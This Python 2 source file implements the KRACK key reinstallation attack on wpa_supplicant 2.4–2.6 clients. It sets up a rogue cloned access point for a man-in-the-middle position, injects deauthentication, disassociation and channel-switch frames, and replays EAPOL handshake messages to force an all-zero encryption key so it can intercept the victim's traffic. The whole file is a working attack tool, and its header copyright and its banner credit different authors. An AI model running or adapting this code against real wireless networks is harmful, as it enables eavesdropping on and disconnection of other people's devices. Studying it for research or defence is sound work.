#!/usr/bin/env python2

# wpa_supplicant v2.4 - v2.6 all-zero encryption key attack
# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

import sys, os
username = os.path.expanduser(os.environ["SUDO_USER"])
sys.path.append('/home/' + username + '/.local/lib/python2.7/site-packages')

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time, argparse, heapq, subprocess, atexit, select, textwrap
from datetime import datetime

from mitm_channel_based.all import *

class ClientState():
	'''
	Description: determine the current state of the client

	Arguments:
	  macaddr: the MAC address of the client to get the state

	Possible states:
	  Initializing
	  Connecting
	  GotMitm
	  Attack_Started
	  Success_Reinstalled
	  Success_AllzeroKey
	  Failed
	
	When the constructor is called, the following arguments are reseted:
	  self.state = ClientState.Initializing
	  self.attack_time = None
	  self.assocreq = None
	  self.msg1 = None
	  self.msg3s = []
	  self.msg4 = None
	'''
	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)

	def __init__(self, macaddr):
		self.macaddr = macaddr
		self.reset()

	def reset(self):
		self.state = ClientState.Initializing
		self.attack_time = None

		self.assocreq = None
		self.msg1 = None
		self.msg3s = []
		self.msg4 = None

	def store_msg1(self, msg1):
		'''
		Description: stores the EAPOL msg1

		Arguments:
		  msg1: the EAPOL msg1
		'''
		self.msg1 = msg1

	def add_if_new_msg3(self, msg3):
		'''
		Description: verifies if the received msg3 is already stored, based on its Replay Counter. If not, it stores on `self.msg3s` array.

		Arguments:
		  msg3: the received EAPOL msg3 packet
		'''
		if get_eapol_replaynum(msg3) in [get_eapol_replaynum(p) for p in self.msg3s]:
			return
		self.msg3s.append(msg3)

	def update_state(self, state):
		'''
		Description: update client state

		Arguments:
		  state: the new state
		
		Possible states:
		  Initializing
		  Connecting
		  GotMitm
		  Attack_Started
		  Success_Reinstalled
		  Success_AllzeroKey
		  Failed
		'''
		log(DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
		self.state = state

	def mark_got_mitm(self):
		'''
		Description: if client state is `Initializing` or `Connecting` moves to the `GotMitm` state
		'''
		if self.state <= ClientState.Connecting:
			self.state = ClientState.GotMitm
			log(STATUS, "Established MitM position against client %s (moved to state %d)" % (self.macaddr, self.state),
				color="green", showtime=False)

	def is_state(self, state):
		'''
		Description: verifies if the current client state is equals `state`

		Arguments:
		  state: the current client state
		
		Possible states:
		  Initializing
		  Connecting
		  GotMitm
		  Attack_Started
		  Success_Reinstalled
		  Success_AllzeroKey
		  Failed
		'''
		return self.state == state

	def should_forward(self, p):
		'''
		Description: establish rules to determine if the the packet `p` shoud or should not be forward

		Arguments:
		  p: the packet to analyze
		
		Fowarding rules when attacking the 4-way handshake:
		  1. Client state:
			Connecting
			GotMitm
			Attack_Started
		  2. Packet type:
			Dot11Auth (authetication)
			Dot11AssoReq (association request)
			Dot11AssoResp (association response)
		  3. EAPOL message number: 1 to 3
		  4. Action Frames

        If the client state is not in the 3 states mentioned above, verifes if state is `Success_Reinstalled`.
		'''

		# Forwarding rules when attacking the 4-way handshake
		if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
			# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
			return Dot11Auth in p or Dot11AssoReq in p or Dot11AssoResp in p or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) \
				or (p.type == 0 and p.subtype == 13)
		return self.state in [ClientState.Success_Reinstalled]

	def attack_start(self):
		'''
		Description: set parameters for attack start

		Parameters:
		  self.attack_max_iv - gets the highest IV
		  self.attack_time - gets the current time of the attack
		  self.update_state - sets ClientState to Attack_Started
		'''
		self.attack_time = time.time()
		self.update_state(ClientState.Attack_Started)

	def is_iv_reseted(self, iv):
		return self.is_state(ClientState.Attack_Started) and iv==1
	
	def attack_timeout(self, iv):
		'''
		Description: verifies if the attack has timed out

		Conditions:
		  Client state is Attack_Started
		  It has past 1.5 seconds from the attack start
		  The IV value is greater than the max IV registred
		'''
		return self.is_state(ClientState.Attack_Started) and self.attack_time + 1.5 < time.time()

class KRAckAttack():
	'''
	Description
	'''
	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, nic_ether, ssid, clientmac=None, dumpfile=None, cont_csa=False):
	
		self.nic_rogue_ap = nic_rogue_ap
		self.ssid = ssid
		self.mitmconfig = None

		# This is set in case of targeted attacks
		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
		
		self.clients = dict()
		self.disas_queue = []
		self.continuous_csa = cont_csa

		# To monitor wether interfaces are (still) on the proper channels
		self.last_real_beacon = None
		self.last_rogue_beacon = None

		self.mitmconfig = MitmChannelBased(nic_real, self.nic_rogue_ap, nic_rogue_mon, nic_ether, self.ssid, self.clientmac, dumpfile)

	def send_disas(self, macaddr):
		'''
		Description: send disassociation packet to the client connect to the Rogue AP. This packet is sent througth the Rogue Socket.
		'''
		p = Dot11(addr1=macaddr, addr2=self.mitmconfig.apmac, addr3=self.mitmconfig.apmac)/Dot11Disas(reason=0)
		self.mitmconfig.sock_rogue.send(p)
		log(STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color="green")

	def queue_disas(self, macaddr):
		'''
		Description: queue the MAC Address of client that has been disassociated

		Arguments:
		  macaddr: the client MAC Address
		'''
		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
		heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))
	
	def hostapd_finish_4way(self, stamac):
		'''
		Description: send FINISH_4WAY signal to hostapd (Rogue AP)
		'''
		log(INFO, "Sent frame to hostapd: finishing 4-way handshake of %s" % stamac, color="orange")
		self.mitmconfig.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
	
	def hostapd_rx_mgmt(self, p):
		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: manage packets sent to hostapd instance

		Arguments:
		  p: 802.11 packet
		'''
		log(INFO, "Sent frame to hostapd: %s" % dot11_to_str(p), color="orange")
		self.mitmconfig.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))

	def hostapd_add_sta(self, macaddr):
		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: forward authentication packet to Rogue AP sent by the client

		Arguments:
		  macaddr: the MAC address of the client to register
		'''
		log(INFO, "Forwarding auth to rouge AP to register client", showtime=False, color="orange")
		self.hostapd_rx_mgmt(Dot11(addr1=self.mitmconfig.apmac, addr2=macaddr, addr3=self.mitmconfig.apmac)/Dot11Auth(seqnum=1))

	def hostapd_add_allzero_client(self, client):
		if client.assocreq is None:
			log(ERROR, "Didn't receive AssocReq of client %s, unable to let rogue hostapd handle client." % client.macaddr)
			return False

		# 1. Add the client to hostapd
		self.hostapd_add_sta(client.macaddr)

		# 2. Inform hostapd of the encryption algorithm and options the client uses
		self.hostapd_rx_mgmt(client.assocreq)

		# 3. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
		self.hostapd_finish_4way(client.macaddr)

		return True

	def handle_to_client_pairwise(self, client, p):
		eapolnum = get_eapol_msgnum(p)
		if eapolnum == 1 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
			log(DEBUG, "Storing msg1")
			client.store_msg1(p)
		elif eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
			client.add_if_new_msg3(p)
			if len(client.msg3s) >= 2:
				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
				log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)

				if client.msg1 is not None:
					packet_list = client.msg3s
					p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
					packet_list.insert(1, p)

					for p in packet_list: self.mitmconfig.sock_rogue.send(p)
					client.msg3s = []

					client.attack_start()
					p = Dot11(addr1=self.mitmconfig.apmac, addr2=client.macaddr, addr3=self.mitmconfig.apmac)/Dot11Deauth(reason=3)
					self.mitmconfig.sock_real.send(p)
				else:
					client.msg3s = []
					pass
			else:
				log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)

			return True

		return False

	def handle_from_client_pairwise(self, client, p):

		iv = dot11_get_iv(p)
		
		if client.is_iv_reseted(iv):
			log(STATUS, "SUCCESS! The nonce was reseted to %d, with usage of all-zero encryption key." % iv, color="green", showtime=False)
			log(STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)

			self.hostapd_add_allzero_client(client)
			
			# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
			client.update_state(ClientState.Success_AllzeroKey)

		elif client.attack_timeout(iv):
			log(WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
			client.update_state(ClientState.Failed)

	def handle_rx_realchan(self):
		'''
		Description: handle with the packets sniffed by the `nic_real` (monitor mode) on the Real Channel.

		Rules to display frames sent TO the real AP:

		Packet is an `authentication frame`: if the source is the client, client is on the Real Channel, so Rogue AP sends 1 target csa_beacon and 1 broadcast csa_beacon to try to change it to the Rogue Channel. Client state is changed to Initialized than to Connecting.

		Packet is an `association request`: if client is already 

		'''
		p = self.mitmconfig.sock_real.recv()
		if p == None: return

		# 1. Handle frames sent TO the real AP
		if p.addr1 == self.mitmconfig.apmac:
			# If it's an authentication to the real AP, always display it ...
			if Dot11Auth in p:
				print_rx(INFO, "Real channel ", p, color="orange")

				# ... with an extra clear warning when we wanted to MitM this specific client
				if self.clientmac == p.addr2:
					log(WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)

				if p.addr2 in self.clients: del self.clients[p.addr2]
				# Send one targeted beacon pair (should be retransmitted in case of failure), and one normal broadcast pair
				self.mitmconfig.send_csa_beacon(newchannel=self.mitmconfig.rogue_channel, target=p.addr2)
				self.mitmconfig.send_csa_beacon(newchannel=self.mitmconfig.rogue_channel)
				self.clients[p.addr2] = ClientState(p.addr2)
				self.clients[p.addr2].update_state(ClientState.Connecting)

			# Remember association request to save connection parameters
			elif Dot11AssoReq in p:
				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p

			# Clients sending a deauthentication or disassociation to the real AP are also interesting ...
			elif Dot11Deauth in p or Dot11Disas in p:
				print_rx(INFO, "Real channel ", p)
				if p.addr2 in self.clients: del self.clients[p.addr2]

			# Display all frames sent from a MitM'ed client
			elif p.addr2 in self.clients:
				print_rx(INFO, "Real channel ", p)

			# For all other frames, only display them if they come from the targeted client
			elif self.clientmac is not None and self.clientmac == p.addr2:
				print_rx(INFO, "Real channel ", p)


			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
				self.mitmconfig.sock_real.send(Dot11(type=2, subtype=4, addr1=self.mitmconfig.apmac, addr2=p.addr2, addr3=self.mitmconfig.apmac))


		# 2. Handle frames sent BY the real AP
		elif p.addr2 == self.mitmconfig.apmac:
			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
			if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.mitmconfig.real_channel:
				self.last_real_beacon = time.time()

			# Decide whether we will (eventually) forward it
			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
			#might_forward = might_forward or (args.group and dot11_is_group(p) and Dot11WEP in p)

			# Pay special attention to Deauth and Disassoc frames
			if Dot11Deauth in p or Dot11Disas in p:
				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
			# If targeting a specific client, display all frames it sends
			elif self.clientmac is not None and self.clientmac == p.addr1:
				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
			# For other clients, just display what might be forwarded
			elif might_forward:
				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")

			# Now perform actual actions that need to be taken, along with additional output
			if might_forward:
				# Unicast frames to clients
				if p.addr1 in self.clients:
					client = self.clients[p.addr1]

					# Note: could be that client only switching to rogue channel before receiving Msg3 and sending Msg4
					if self.handle_to_client_pairwise(client, p):
						pass

					elif Dot11Deauth in p:
						del self.clients[p.addr1]
						self.mitmconfig.sock_rogue.send(p)

					else:
						self.mitmconfig.sock_rogue.send(p)

				# Group addressed frames
				else:
					self.mitmconfig.sock_rogue.send(p)

		# 3. Always display all frames sent by or to the targeted client
		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
			print_rx(INFO, "Real channel ", p)

	def handle_rx_roguechan(self):
		p = self.mitmconfig.sock_rogue.recv()
		if p == None: return

		# 1. Handle frames sent BY the rouge AP
		if p.addr2 == self.mitmconfig.apmac:
			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
			if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.mitmconfig.rogue_channel:
				self.last_rogue_beacon = time.time()
			# Display all frames sent to the targeted client
			if self.clientmac is not None and p.addr1 == self.clientmac:
				print_rx(INFO, "Rogue channel", p)
			# And display all frames sent to a MitM'ed client
			elif p.addr1 in self.clients:
				print_rx(INFO, "Rogue channel", p)

		# 2. Handle frames sent TO the AP
		elif p.addr1 == self.mitmconfig.apmac:
			client = None

			

			# Check if it's a new client that we can MitM
			if Dot11Auth in p:
				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
				self.clients[p.addr2] = ClientState(p.addr2)
				self.clients[p.addr2].mark_got_mitm()
				client = self.clients[p.addr2]
				will_forward = True
			# Otherwise check of it's an existing client we are tracking/MitM'ing
			elif p.addr2 in self.clients:
				client = self.clients[p.addr2]
				will_forward = client.should_forward(p)
				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
			# Always display all frames sent by the targeted client
			elif p.addr2 == self.clientmac:
				print_rx(INFO, "Rogue channel", p)

			# If this now belongs to a client we want to track, process the packet further
			if client is not None:
				# Save the association request so we can track the encryption algorithm and options the client uses
				if Dot11AssoReq in p: client.assocreq = p
				# Save msg4 so we can complete the handshake once we attempted a key reinstallation attack
				if get_eapol_msgnum(p) == 4: client.msg4 = p

				# Client is sending on rogue channel, we got a MitM position =)
				client.mark_got_mitm()

				if Dot11WEP in p:
					# Use encrypted frames to determine if the key reinstallation attack succeeded
					self.handle_from_client_pairwise(client, p)

				if will_forward:
					# Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
					if client.state < ClientState.Attack_Started:
						p.FCfield &= 0xFFEF

					self.mitmconfig.sock_real.send(p)


		# 3. Always display all frames sent by or to the targeted client
		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
			print_rx(INFO, "Rogue channel", p)

	def handle_hostapd_out(self):
		# hostapd always prints lines so this should not block
		line = self.mitmconfig.hostapd.stdout.readline()
		if line == "":
			log(ERROR, "Rogue hostapd instances unexpectedly closed")
			quit(1)

		if line.startswith(">>>> "):
			log(STATUS, "Rogue hostapd: " + line[5:].strip())
		elif line.startswith(">>> "):
			log(DEBUG, "Rogue hostapd: " + line[4:].strip())
		# This is a bit hacky but very usefull for quick debugging
		elif "fc=0xc0" in line:
			log(WARNING, "Rogue hostapd: " + line.strip())
		elif "AP-STA-CONNECTED" in line or "sta_remove" in line or "Add STA" in line or "disassoc cb" in line or "disassocation: STA" in line:
			log(INFO, "Rogue hostapd: " + line.strip(), color="green")
		elif "authorizing port" in line or "pairwise key handshake completed" in line:
			log(INFO, "Rogue hostapd: " + line.strip(), color="green")
		elif "Using interface" in line:
			log(INFO, "Rogue hostapd: " + line.strip(), color="green")
		else:
			log(ALL, "Rogue hostapd: " + line.strip())

		self.mitmconfig.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line)
		
	def run(self, strict_echo_test=False):
		
		self.mitmconfig.run()
		subprocess.Popen(["./monitor_rogue_ap_interface.sh", self.nic_rogue_ap], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

		# Try to deauthenticated all clients
		deauth = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.mitmconfig.apmac, addr3=self.mitmconfig.apmac)/Dot11Deauth(reason=3)
		self.mitmconfig.sock_real.send(deauth)

		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
		if self.clientmac:
			self.queue_disas(self.clientmac)

		# Continue attack by monitoring both channels and performing needed actions
		self.last_real_beacon = time.time()
		self.last_rogue_beacon = time.time()
		nextbeacon = time.time() + 0.01
		while True:
			sel = select.select([self.mitmconfig.sock_rogue, self.mitmconfig.sock_real, self.mitmconfig.hostapd.stdout], [], [], 0.1)
			if self.mitmconfig.sock_real      in sel[0]: self.handle_rx_realchan()
			if self.mitmconfig.sock_rogue     in sel[0]: self.handle_rx_roguechan()
			if self.mitmconfig.hostapd.stdout in sel[0]: self.handle_hostapd_out()

			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
				self.send_disas(self.disas_queue.pop()[1])

			if self.continuous_csa and nextbeacon <= time.time():
				self.mitmconfig.send_csa_beacon(newchannel=self.mitmconfig.rogue_channel, silent=True)
				nextbeacon += 0.10

			if self.last_real_beacon + 2 < time.time():
				log(WARNING, "WARNING: Didn't receive beacon from real AP for two seconds")
				self.last_real_beacon = time.time()
			if self.last_rogue_beacon + 2 < time.time():
				log(WARNING, "WARNING: Didn't receive beacon from rogue AP for two seconds")
				self.last_rogue_beacon = time.time()


	def stop(self):
		log(STATUS, "Closing hostapd and cleaning up ...")
		if self.mitmconfig.hostapd:
			self.mitmconfig.hostapd.terminate()
			self.mitmconfig.hostapd.wait()
		if self.mitmconfig.hostapd_log:
			self.mitmconfig.hostapd_log.close()
		if self.mitmconfig.sock_real: self.mitmconfig.sock_real.close()
		if self.mitmconfig.sock_rogue: self.mitmconfig.sock_rogue.close()


def cleanup():
	attack.stop()

if __name__ == "__main__":
	description = textwrap.dedent(
		"""\
		Key Reinstallation Attacks (KRACKs) by Lucas Woody
		-----------------------------------------------------------
			- Uses CSA beacons to obtain channel-based MitM position
			- Can detect and handle wpa_supplicant all-zero key installations""")
	parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)

	# Required arguments
	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
	parser.add_argument("nic_rogue_ap", help="Wireless interface that will run a rogue AP using a modified hostapd.")
	parser.add_argument("nic_ether", help="Rogue AP WAN (ethernet) interface.")
	parser.add_argument("ssid", help="The SSID of the network to attack.")

	# Optional arguments
	parser.add_argument("-m", "--nic-rogue-mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
	parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
	parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
	parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
	parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
	parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)", action='store_true')

	args = parser.parse_args()

	global_log_level = max(ALL, global_log_level - args.debug)

	print "\n\t===[ KRACK Attacks against Linux/Android by Lucas Woody ]===\n"
	attack = KRAckAttack(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.nic_ether, args.ssid, args.target, args.dump, args.continuous_csa)
	atexit.register(cleanup)
	attack.run(strict_echo_test=args.strict_echo_test)


